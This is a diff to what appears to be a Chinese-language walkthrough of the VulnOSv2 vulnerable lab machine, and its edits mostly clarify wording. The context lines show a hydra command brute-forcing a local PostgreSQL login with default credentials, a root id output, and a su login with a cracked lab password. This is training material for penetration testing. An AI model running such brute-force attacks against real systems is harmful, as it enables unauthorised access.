@@ -1120,7 +1120,7 @@ uid=0(root) gid=0(root) groups=0(root),1001(webmin)
 root
 ```
 ## 5.2 postgres密码爆破
-通过查看后台监听的端口，几hydra文件猜测是要进行暴力破解，数据库postgres的默认用户名是postgres，因此尝试一下默认用户名爆破:postgres/postgres
+通过查看后台监听的端口及hydra文件猜测是要进行暴力破解，数据库postgres的默认用户名是postgres，因此尝试一下默认用户名爆破:postgres/postgres
 ```shell
 webmin@VulnOSv2:~/post$ ./hydra -l postgres -e nsr postgres://localhost:5432
 Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -1515,8 +1515,7 @@ No relations found.
 
 
 
-
-得到第四个账号：vulnosadmin/c4nuh4ckm3tw1c3
+通过hydra破解得到的postgres/postgres,查看system表可以得到第四个账号：vulnosadmin/c4nuh4ckm3tw1c3
 ```shell
 webmin@VulnOSv2:~$ su vulnosadmin
 Password:c4nuh4ckm3tw1c3
